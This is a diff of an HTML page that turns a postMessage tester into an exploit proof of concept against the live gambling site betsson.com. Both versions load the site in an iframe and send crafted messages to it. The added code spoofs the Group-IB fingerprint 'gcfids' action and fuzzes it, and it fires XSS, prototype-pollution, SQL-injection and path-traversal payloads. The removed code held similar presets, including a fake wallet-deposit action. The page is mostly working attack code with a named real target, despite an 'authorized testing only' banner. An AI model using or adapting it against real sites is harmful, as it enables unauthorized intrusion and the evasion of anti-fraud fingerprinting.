@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PostMessage Exploit Tester - Betsson.com</title>
+    <title>Betsson PostMessage Exploit PoC</title>
     <style>
         * {
             margin: 0;
@@ -12,279 +12,256 @@
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Courier New', monospace;
+            background: #0a0e27;
+            color: #00ff00;
             padding: 20px;
-            min-height: 100vh;
         }
         
         .container {
-            max-width: 1400px;
+            max-width: 1200px;
             margin: 0 auto;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            overflow: hidden;
         }
         
-        .header {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            color: white;
-            padding: 30px;
+        h1 {
             text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 28px;
+            color: #ff0000;
+            font-size: 32px;
             margin-bottom: 10px;
+            text-shadow: 0 0 10px #ff0000;
         }
         
-        .header p {
-            opacity: 0.9;
-            font-size: 14px;
-        }
-        
-        .main-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            padding: 30px;
+        .subtitle {
+            text-align: center;
+            color: #00ff00;
+            margin-bottom: 30px;
         }
         
         .panel {
-            background: #f8f9fa;
+            background: #1a1f3a;
+            border: 2px solid #00ff00;
             border-radius: 8px;
             padding: 20px;
-            border: 1px solid #e0e0e0;
+            margin-bottom: 20px;
         }
         
         .panel h2 {
-            font-size: 18px;
+            color: #00ff00;
             margin-bottom: 15px;
-            color: #2a5298;
-            border-bottom: 2px solid #667eea;
+            border-bottom: 1px solid #00ff00;
             padding-bottom: 10px;
         }
         
-        .form-group {
-            margin-bottom: 15px;
+        pre {
+            background: #0a0e27;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            overflow-x: auto;
+            border-radius: 4px;
+            margin: 10px 0;
         }
         
-        label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 5px;
-            color: #333;
-            font-size: 13px;
+        .finding {
+            background: #2a1f1a;
+            border-left: 4px solid #ff0000;
+            padding: 15px;
+            margin: 10px 0;
         }
         
-        input, textarea, select {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 14px;
-            font-family: monospace;
-            transition: border-color 0.3s;
-        }
-        
-        input:focus, textarea:focus, select:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        
-        textarea {
-            min-height: 100px;
-            resize: vertical;
+        .success {
+            background: #1a2a1f;
+            border-left: 4px solid #00ff00;
+            padding: 15px;
+            margin: 10px 0;
         }
         
         button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            background: #ff0000;
+            color: #fff;
             border: none;
-            padding: 12px 24px;
-            border-radius: 6px;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            transition: transform 0.2s, box-shadow 0.2s;
-            margin-right: 10px;
-            margin-top: 10px;
+            border-radius: 4px;
+            margin: 5px;
+            font-family: 'Courier New', monospace;
         }
         
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+            background: #cc0000;
+            box-shadow: 0 0 20px #ff0000;
         }
         
-        button:active {
-            transform: translateY(0);
+        button.safe {
+            background: #00aa00;
         }
         
-        .preset-buttons {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-top: 10px;
+        button.safe:hover {
+            background: #008800;
+            box-shadow: 0 0 20px #00ff00;
         }
         
-        .preset-buttons button {
-            flex: 1;
-            min-width: 120px;
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            margin: 0;
-        }
-        
-        iframe {
+        input, textarea {
             width: 100%;
-            height: 600px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            background: white;
-        }
-        
-        .log-container {
-            grid-column: 1 / -1;
+            background: #0a0e27;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            margin: 5px 0;
         }
         
         #log {
-            background: #1e1e1e;
-            color: #00ff00;
+            background: #0a0e27;
+            border: 2px solid #00ff00;
             padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
             max-height: 400px;
             overflow-y: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            font-size: 12px;
+            margin-top: 20px;
         }
         
         .log-entry {
-            margin-bottom: 8px;
+            margin: 5px 0;
             padding: 5px;
             border-left: 3px solid #00ff00;
             padding-left: 10px;
         }
         
-        .log-entry.error {
-            border-left-color: #ff4444;
-            color: #ff4444;
+        .log-entry.attack {
+            border-left-color: #ff0000;
+            color: #ff6666;
         }
         
-        .log-entry.success {
-            border-left-color: #00ff00;
-            color: #00ff00;
+        .log-entry.response {
+            border-left-color: #ffaa00;
+            color: #ffaa00;
         }
         
-        .log-entry.info {
-            border-left-color: #44aaff;
-            color: #44aaff;
+        iframe {
+            width: 100%;
+            height: 500px;
+            border: 2px solid #00ff00;
+            background: white;
+            margin: 10px 0;
         }
         
-        .timestamp {
-            color: #888;
-            font-size: 10px;
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
         }
         
-        .full-width {
-            grid-column: 1 / -1;
-        }
-        
-        .clear-log {
-            background: #ff4444;
-            margin-top: 10px;
+        .warning {
+            background: #ff0000;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            border-radius: 4px;
+            margin-bottom: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>PostMessage Exploit Tester</h1>
-            <p>Target: betsson.com | Testing for postMessage vulnerabilities</p>
+        <h1>BETSSON POSTMESSAGE EXPLOIT PoC</h1>
+        <div class="subtitle">Discovered Action: gcfids (Group-IB Fingerprint IDS)</div>
+        
+        <div class="warning">
+            FOR AUTHORIZED SECURITY TESTING ONLY
         </div>
         
-        <div class="main-content">
+        <div class="panel">
+            <h2>DISCOVERY SUMMARY</h2>
+            
+            <div class="finding">
+                <strong>CRITICAL FINDING #1:</strong> Action Value Discovered<br>
+                <code>action: "gcfids"</code>
+            </div>
+            
+            <div class="finding">
+                <strong>CRITICAL FINDING #2:</strong> Message Structure<br>
+                <pre>{"action":"gcfids","data":{"id":"base64_string"}}</pre>
+            </div>
+            
+            <div class="finding">
+                <strong>CRITICAL FINDING #3:</strong> Wildcard Origin<br>
+                The iframe sends messages with origin <code>"*"</code> - accepts from anywhere!
+            </div>
+            
+            <div class="finding">
+                <strong>CRITICAL FINDING #4:</strong> Periodic Execution<br>
+                Runs every 500ms via <code>setInterval</code>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>ORIGINAL CODE FOUND</h2>
+            <pre>a();setInterval(a,500);function a(){
+    try{
+        window.parent.postMessage(
+            JSON.stringify({
+                action:"gcfids",
+                data:{
+                    id:"eibBxCaUc2gCzrcOA-CN5nKWtvE9gX-IPsUzqHCGQkx7+p+226WQZk4FP+JMeZPxeY6-wpVWaWunHxwftTBiE-Hg+5GhowBTisg7Z1IO9yt9ElZJHv-RJwrtMvl0"
+                }
+            }),
+            "*"
+        )
+    }catch(b){}
+};</pre>
+        </div>
+        
+        <div class="grid">
             <div class="panel">
-                <h2>Message Configuration</h2>
+                <h2>EXPLOIT CONFIGURATION</h2>
                 
-                <div class="form-group">
-                    <label>Target URL:</label>
-                    <input type="text" id="targetUrl" value="https://www.betsson.com">
-                </div>
+                <label>Target URL:</label>
+                <input type="text" id="targetUrl" value="https://www.betsson.com">
                 
-                <div class="form-group">
-                    <label>Target Origin:</label>
-                    <input type="text" id="targetOrigin" value="https://www.betsson.com">
-                </div>
+                <label>Custom ID (or leave for random):</label>
+                <input type="text" id="customId" placeholder="Auto-generated if empty">
                 
-                <div class="form-group">
-                    <label>Message Type:</label>
-                    <select id="messageType">
-                        <option value="json">JSON Object</option>
-                        <option value="string">String</option>
-                        <option value="custom">Custom JavaScript</option>
-                    </select>
-                </div>
+                <label>Custom Data:</label>
+                <textarea id="customData" rows="4">{"id":"INJECTED_PAYLOAD"}</textarea>
                 
-                <div class="form-group">
-                    <label>Payload:</label>
-                    <textarea id="payload">{"action":"test","data":"probe"}</textarea>
-                </div>
-                
-                <button onclick="sendMessage()">Send Message</button>
-                <button onclick="loadTarget()" style="background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);">Reload Target</button>
+                <button class="safe" onclick="loadTarget()">Load Target</button>
+                <button onclick="sendGcfidsExploit()">Send GCFIDS Exploit</button>
+                <button onclick="fuzzGcfids()">Fuzz ID Values</button>
+                <button onclick="interceptMode()">Intercept Mode</button>
             </div>
             
             <div class="panel">
-                <h2>Preset Attack Vectors</h2>
+                <h2>ATTACK VECTORS</h2>
                 
-                <div class="preset-buttons">
-                    <button onclick="loadPreset('origin-spoof')">Origin Spoof</button>
-                    <button onclick="loadPreset('proto-pollution')">Proto Pollution</button>
-                    <button onclick="loadPreset('xss-payload')">XSS Attempt</button>
-                    <button onclick="loadPreset('wallet-action')">Wallet Action</button>
-                    <button onclick="loadPreset('groupib-action')">Group-IB Test</button>
-                    <button onclick="loadPreset('null-origin')">Null Origin</button>
-                    <button onclick="loadPreset('action-bruteforce')">Action Fuzzing</button>
-                    <button onclick="loadPreset('deep-object')">Deep Object</button>
-                </div>
-                
-                <div class="form-group" style="margin-top: 20px;">
-                    <label>Auto-Test Suite:</label>
-                    <button onclick="runAutoTest()" style="width: 100%; background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">
-                        Run Automated Tests
-                    </button>
-                </div>
+                <button onclick="testVector('null-id')">Test: NULL ID</button>
+                <button onclick="testVector('empty-id')">Test: Empty ID</button>
+                <button onclick="testVector('xss-id')">Test: XSS in ID</button>
+                <button onclick="testVector('proto-pollution')">Test: Proto Pollution</button>
+                <button onclick="testVector('long-id')">Test: Buffer Overflow</button>
+                <button onclick="testVector('special-chars')">Test: Special Chars</button>
+                <button onclick="testVector('sqli')">Test: SQL Injection</button>
+                <button onclick="testVector('path-traversal')">Test: Path Traversal</button>
             </div>
-            
-            <div class="panel full-width">
-                <h2>Target Window</h2>
-                <iframe id="targetFrame" src=""></iframe>
-            </div>
-            
-            <div class="panel log-container">
-                <h2>Activity Log</h2>
-                <div id="log"></div>
-                <button class="clear-log" onclick="clearLog()">Clear Log</button>
-            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>TARGET IFRAME</h2>
+            <iframe id="targetFrame"></iframe>
+        </div>
+        
+        <div class="panel">
+            <h2>ATTACK LOG</h2>
+            <div id="log"></div>
         </div>
     </div>
     
     <script>
-        var targetFrame;
-        var messageCount = 0;
-        
-        window.addEventListener('DOMContentLoaded', function() {
-            targetFrame = document.getElementById('targetFrame');
-            log('System initialized', 'info');
-            log('Listening for postMessage responses...', 'info');
-            
-            window.addEventListener('message', function(event) {
-                log('Received message from: ' + event.origin, 'success');
-                log('Data: ' + JSON.stringify(event.data, null, 2), 'info');
-            });
-        });
+        var targetFrame = null;
+        var attackCount = 0;
+        var intercepting = false;
         
         function log(message, type) {
             if (!type) type = 'info';
@@ -292,159 +269,164 @@
             var timestamp = new Date().toLocaleTimeString();
             var entry = document.createElement('div');
             entry.className = 'log-entry ' + type;
-            entry.innerHTML = '<span class="timestamp">[' + timestamp + ']</span> ' + escapeHtml(message);
+            entry.textContent = '[' + timestamp + '] ' + message;
             logDiv.appendChild(entry);
             logDiv.scrollTop = logDiv.scrollHeight;
         }
         
-        function escapeHtml(text) {
-            var div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-        
-        function clearLog() {
-            document.getElementById('log').innerHTML = '';
-            log('Log cleared', 'info');
-        }
-        
         function loadTarget() {
             var url = document.getElementById('targetUrl').value;
+            targetFrame = document.getElementById('targetFrame');
             targetFrame.src = url;
             log('Loading target: ' + url, 'info');
         }
         
-        function sendMessage() {
-            var origin = document.getElementById('targetOrigin').value;
-            var messageType = document.getElementById('messageType').value;
-            var payloadText = document.getElementById('payload').value;
-            
-            var payload;
-            
-            try {
-                if (messageType === 'json') {
-                    payload = JSON.parse(payloadText);
-                } else if (messageType === 'string') {
-                    payload = payloadText;
-                } else {
-                    payload = eval('(' + payloadText + ')');
-                }
-                
-                if (targetFrame.contentWindow) {
-                    targetFrame.contentWindow.postMessage(payload, origin);
-                    messageCount++;
-                    log('Message #' + messageCount + ' sent to ' + origin, 'success');
-                    log('Payload: ' + JSON.stringify(payload, null, 2), 'info');
-                } else {
-                    log('Target frame not loaded', 'error');
-                }
-            } catch (e) {
-                log('Error: ' + e.message, 'error');
+        function generateRandomId() {
+            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-';
+            var length = 80 + Math.floor(Math.random() * 20);
+            var result = '';
+            for (var i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
             }
+            return result;
         }
         
-        function loadPreset(preset) {
-            var payloadField = document.getElementById('payload');
-            var typeField = document.getElementById('messageType');
+        function sendGcfidsExploit() {
+            if (!targetFrame || !targetFrame.contentWindow) {
+                log('ERROR: Target frame not loaded!', 'attack');
+                return;
+            }
             
-            var presets = {
-                'origin-spoof': {
-                    type: 'json',
-                    payload: '{"action":"authenticate","data":{"user":"admin","token":"test"}}'
-                },
-                'proto-pollution': {
-                    type: 'json',
-                    payload: '{"__proto__":{"isAdmin":true},"action":"test","data":"pollution"}'
-                },
-                'xss-payload': {
-                    type: 'json',
-                    payload: '{"action":"eval","data":"<img src=x onerror=alert(document.domain)>"}'
-                },
-                'wallet-action': {
-                    type: 'json',
-                    payload: '{"action":"wallet.deposit","amount":1000,"currency":"EUR"}'
-                },
-                'groupib-action': {
-                    type: 'json',
-                    payload: '{"action":"groupib.validate","data":{"session":"test123"}}'
-                },
-                'null-origin': {
-                    type: 'json',
-                    payload: '{"origin":null,"action":"bypass","data":"test"}'
-                },
-                'action-bruteforce': {
-                    type: 'custom',
-                    payload: '["login","auth","authenticate","verify","validate","execute","run","process","handle","wallet","payment","deposit","withdraw","transfer"].map(function(a) { return {action: a, data: "test"}; })'
-                },
-                'deep-object': {
-                    type: 'json',
-                    payload: '{"action":"test","data":{"level1":{"level2":{"level3":{"payload":"<scr"+"ipt>alert(1)</scr"+"ipt>"}}}}}'
+            var customId = document.getElementById('customId').value;
+            var id = customId || generateRandomId();
+            
+            var payload = {
+                action: 'gcfids',
+                data: {
+                    id: id
                 }
             };
             
-            if (presets[preset]) {
-                typeField.value = presets[preset].type;
-                payloadField.value = presets[preset].payload;
-                log('Loaded preset: ' + preset, 'info');
+            try {
+                targetFrame.contentWindow.postMessage(JSON.stringify(payload), '*');
+                attackCount++;
+                log('ATTACK #' + attackCount + ' - Sent gcfids payload', 'attack');
+                log('ID: ' + id.substring(0, 50) + '...', 'attack');
+            } catch (e) {
+                log('ERROR: ' + e.message, 'attack');
             }
         }
         
-        function runAutoTest() {
-            log('Starting automated test suite...', 'info');
+        function testVector(vectorName) {
+            if (!targetFrame || !targetFrame.contentWindow) {
+                log('ERROR: Target frame not loaded!', 'attack');
+                return;
+            }
             
-            var tests = [
-                'origin-spoof',
-                'proto-pollution',
-                'xss-payload',
-                'wallet-action',
-                'groupib-action',
-                'null-origin',
-                'deep-object'
-            ];
+            var vectors = {
+                'null-id': {
+                    action: 'gcfids',
+                    data: {
+                        id: null
+                    }
+                },
+                'empty-id': {
+                    action: 'gcfids',
+                    data: {
+                        id: ''
+                    }
+                },
+                'xss-id': {
+                    action: 'gcfids',
+                    data: {
+                        id: '<img src=x onerror=alert(document.domain)>'
+                    }
+                },
+                'proto-pollution': {
+                    action: 'gcfids',
+                    data: {
+                        id: 'test',
+                        __proto__: {
+                            isAdmin: true
+                        }
+                    }
+                },
+                'long-id': {
+                    action: 'gcfids',
+                    data: {
+                        id: new Array(10000).join('A')
+                    }
+                },
+                'special-chars': {
+                    action: 'gcfids',
+                    data: {
+                        id: '\'";\\x00\\xFF\\uFFFF'
+                    }
+                },
+                'sqli': {
+                    action: 'gcfids',
+                    data: {
+                        id: '\' OR 1=1--'
+                    }
+                },
+                'path-traversal': {
+                    action: 'gcfids',
+                    data: {
+                        id: '../../../etc/passwd'
+                    }
+                }
+            };
             
-            var index = 0;
+            var payload = vectors[vectorName];
             
-            function runNext() {
-                if (index >= tests.length) {
-                    log('Automated test suite completed', 'success');
+            try {
+                targetFrame.contentWindow.postMessage(JSON.stringify(payload), '*');
+                attackCount++;
+                log('ATTACK #' + attackCount + ' - Testing: ' + vectorName, 'attack');
+                log('Payload: ' + JSON.stringify(payload), 'attack');
+            } catch (e) {
+                log('ERROR: ' + e.message, 'attack');
+            }
+        }
+        
+        function fuzzGcfids() {
+            log('Starting GCFIDS fuzzing attack...', 'attack');
+            var count = 0;
+            var interval = setInterval(function() {
+                if (count >= 20) {
+                    clearInterval(interval);
+                    log('Fuzzing complete - sent 20 payloads', 'attack');
                     return;
                 }
-                
-                log('Running test ' + (index + 1) + '/' + tests.length + ': ' + tests[index], 'info');
-                loadPreset(tests[index]);
-                
-                setTimeout(function() {
-                    sendMessage();
-                    setTimeout(function() {
-                        index++;
-                        runNext();
-                    }, 1000);
-                }, 500);
-            }
-            
-            runNext();
+                sendGcfidsExploit();
+                count++;
+            }, 200);
         }
         
-        function fuzzActions() {
-            var commonActions = [
-                'init', 'execute', 'run', 'process', 'handle', 'callback',
-                'authenticate', 'login', 'logout', 'verify', 'validate',
-                'wallet', 'payment', 'deposit', 'withdraw', 'transfer',
-                'user', 'account', 'profile', 'settings', 'config',
-                'data', 'fetch', 'load', 'save', 'update', 'delete',
-                'groupib', 'security', 'check', 'scan', 'monitor'
-            ];
-            
-            log('Starting action fuzzing...', 'info');
-            
-            commonActions.forEach(function(action, index) {
-                setTimeout(function() {
-                    var payload = {action: action, data: 'fuzz'};
-                    targetFrame.contentWindow.postMessage(payload, '*');
-                    log('Fuzzing action: ' + action, 'info');
-                }, index * 200);
-            });
+        function interceptMode() {
+            intercepting = !intercepting;
+            if (intercepting) {
+                log('INTERCEPT MODE ACTIVATED - monitoring all messages', 'info');
+            } else {
+                log('INTERCEPT MODE DEACTIVATED', 'info');
+            }
         }
+        
+        // Listen for responses
+        window.addEventListener('message', function(event) {
+            log('RECEIVED MESSAGE from: ' + event.origin, 'response');
+            log('Data: ' + JSON.stringify(event.data), 'response');
+            
+            if (intercepting) {
+                log('INTERCEPTED: ' + JSON.stringify(event.data, null, 2), 'response');
+            }
+        });
+        
+        // Auto-initialize
+        window.addEventListener('DOMContentLoaded', function() {
+            log('Exploit PoC initialized', 'info');
+            log('Ready to attack betsson.com', 'info');
+        });
     </script>
 </body>
 </html>
